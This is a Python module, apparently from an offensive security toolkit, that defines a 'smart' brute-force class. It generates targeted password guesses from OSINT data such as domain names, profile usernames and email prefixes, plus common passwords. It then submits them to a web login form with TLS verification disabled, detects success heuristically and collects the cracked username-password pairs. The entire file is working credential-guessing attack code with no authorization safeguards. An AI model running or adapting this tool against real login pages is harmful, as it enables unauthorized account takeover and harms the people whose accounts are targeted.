"""Smart Brute Force - OSINT-powered password attacks."""

import itertools
import string
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from datetime import datetime

import httpx
from ..utils.logger import logger


@dataclass
class BruteResult:
    """Result of a brute force attempt."""
    success: bool
    username: str
    password: str
    url: str
    status_code: int
    response_length: int
    response_time_ms: float
    attempt_number: int


class SmartBruteForce:
    """OSINT-powered smart brute force - uses gathered info for targeted attempts."""

    COMMON_PASSWORDS = [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "bailey", "passw0rd", "shadow", "123123", "654321",
        "superman", "qazwsx", "michael", "football", "password1",
        "password123", "admin", "admin123", "root", "toor",
        "changeme", "default", "guest", "test", "test123",
    ]

    KEYBOARD_PATTERNS = [
        "qwerty", "asdfgh", "zxcvbn", "qazwsx",
        "1qaz2wsx", "qwe123", "asd123", "abc123",
        "admin1", "admin12", "pass1", "pass12",
    ]

    def __init__(self):
        self.results: List[BruteResult] = []
        self.attempt_count = 0
        self.client = httpx.Client(follow_redirects=True, timeout=10, verify=False)

    def generate_passwords(self, target_info: Dict, extra_words: Optional[List[str]] = None) -> List[str]:
        """Generate smart password list based on OSINT."""
        passwords = set()

        # Add common passwords
        passwords.update(self.COMMON_PASSWORDS)
        passwords.update(self.KEYBOARD_PATTERNS)

        # Target-specific passwords
        base = target_info.get("target", "").split(".")[0]
        if base:
            passwords.add(base)
            passwords.add(f"{base}123")
            passwords.add(f"{base}!")
            passwords.add(f"{base}@2024")
            passwords.add(f"{base}@2025")
            passwords.add(f"{base}2024")
            passwords.add(f"{base}2025")
            passwords.add(f"{base}1")
            passwords.add(f"{base}12")
            passwords.add(f"password{base}")
            passwords.add(f"{base}password")

        # Name-based passwords from profiles
        for profile in target_info.get("profiles", []):
            name = profile.get("username", "")
            if name:
                passwords.add(name)
                passwords.add(f"{name}123")
                passwords.add(f"{name}!")
                passwords.add(f"{name}@123")

        # Email-based
        for email in target_info.get("emails", []):
            name = email.split("@")[0]
            passwords.add(name)
            passwords.add(f"{name}123")
            passwords.add(f"{name}!")

        # Extra words
        if extra_words:
            passwords.update(extra_words)

        passwords.discard("")
        return sorted(passwords)

    def try_login(self, url: str, username: str, password: str,
                  user_field: str = "username", pass_field: str = "password",
                  success_indicator: str = "Welcome",
                  method: str = "POST") -> BruteResult:
        """Try a single login attempt."""
        import time

        data = {
            user_field: username,
            pass_field: password,
        }

        start = time.time()
        try:
            if method.upper() == "POST":
                response = self.client.post(url, data=data)
            else:
                response = self.client.get(url, params=data)

            elapsed = (time.time() - start) * 1000
            self.attempt_count += 1

            # Determine success
            body = response.text.lower()
            success = False

            # Multiple indicators
            if success_indicator.lower() in body:
                success = True
            elif response.status_code in (301, 302) and "login" not in response.headers.get("location", "").lower():
                success = True
            elif "logout" in body or "dashboard" in body or "welcome" in body:
                success = True
            elif "invalid" not in body and "error" not in body and "incorrect" not in body:
                # If no error message, might be success
                if response.status_code == 200 and len(body) > 500:
                    pass  # inconclusive

            result = BruteResult(
                success=success,
                username=username,
                password=password,
                url=url,
                status_code=response.status_code,
                response_length=len(body),
                response_time_ms=elapsed,
                attempt_number=self.attempt_count,
            )

            self.results.append(result)
            return result

        except Exception as e:
            elapsed = (time.time() - start) * 1000
            result = BruteResult(
                success=False,
                username=username,
                password=password,
                url=url,
                status_code=0,
                response_length=0,
                response_time_ms=elapsed,
                attempt_number=self.attempt_count,
            )
            self.results.append(result)
            return result

    def smart_brute(self, url: str, usernames: List[str], target_info: Dict,
                    user_field: str = "username", pass_field: str = "password",
                    max_attempts: int = 100) -> List[BruteResult]:
        """Smart brute force using OSINT-generated passwords."""
        logger.info(f"[bold red]Smart brute force: {url}[/bold red]")
        logger.info(f"  Usernames: {len(usernames)}, Max attempts: {max_attempts}")

        # Generate smart password list
        passwords = self.generate_passwords(target_info)
        logger.info(f"  Generated {len(passwords)} passwords from OSINT")

        found = []
        attempts = 0

        for username in usernames:
            for password in passwords:
                if attempts >= max_attempts:
                    logger.warning(f"  Max attempts ({max_attempts}) reached")
                    return found

                result = self.try_login(url, username, password, user_field, pass_field)
                attempts += 1

                if result.success:
                    logger.info(f"  [bold green]FOUND: {username}:{password}[/bold green]")
                    found.append(result)
                    break  # Move to next username

                if attempts % 10 == 0:
                    logger.info(f"  Progress: {attempts}/{max_attempts} attempts")

        logger.info(f"  Brute force complete: {len(found)} credentials found")
        return found

    def get_stats(self) -> Dict:
        success = [r for r in self.results if r.success]
        return {
            "total_attempts": self.attempt_count,
            "successful": len(success),
            "credentials_found": [(r.username, r.password) for r in success],
            "avg_response_ms": (
                sum(r.response_time_ms for r in self.results) / len(self.results)
                if self.results else 0
            )
        }
